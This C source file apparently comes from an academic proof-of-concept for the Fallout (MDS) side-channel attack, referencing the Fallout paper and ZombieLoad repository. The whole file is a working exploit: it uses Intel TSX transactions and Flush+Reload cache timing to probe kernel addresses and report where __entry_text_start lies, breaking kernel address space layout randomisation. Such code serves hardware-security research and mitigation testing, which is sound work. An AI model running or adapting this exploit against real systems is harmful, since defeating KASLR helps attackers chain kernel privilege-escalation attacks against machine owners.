/**
 * gcc fallout_kaslr.c -o fallout_kaslr -mrtm && ./fallout_kaslr
 *
 * References:
 * https://mdsattacks.com/files/fallout.pdf
 * https://github.com/IAIK/ZombieLoad
 *
 **/

#include <fcntl.h>
#include <memory.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include "cacheutils.h"

#define CACHE_MISS 250
#define PAGE_SIZE 4096

char __attribute__((aligned(PAGE_SIZE))) mem[256 * PAGE_SIZE];

int check(void);

int main(int argc, char *argv[]) {
  memset(mem, 0, sizeof(mem));
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * PAGE_SIZE);
  }

  char *page = (char *)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);

  char *kernel_base = (char *)0xffffffff80000000ull;

  int offset = 7;
  while ((uint64_t)kernel_base < 0xffffffffc0000000ull) {
    unsigned long long found = 0;
    for (size_t i = 0; i < 5; i++) {
      flush(page);
      page[offset] = 'A';

      if (_xbegin() == _XBEGIN_STARTED) {
        maccess(mem + PAGE_SIZE * kernel_base[offset]);
        _xend();
      }
      found += check();
    }
    if (found >= 4) {
      fprintf(stderr, "[+] Found __entry_text_start at: %p\n", kernel_base);
      return 0;
    } else {
      kernel_base += 0x100000;
    }
  }
  fprintf(stderr, "[+] Not found\n");
  return 0;
}

int check(void) {
  int update = 0;
  for (size_t i = 0; i < 0x100; i++) {
    if (flush_reload((char *)mem + PAGE_SIZE * i)) {
      return 1;
    }
  }
  return 0;
}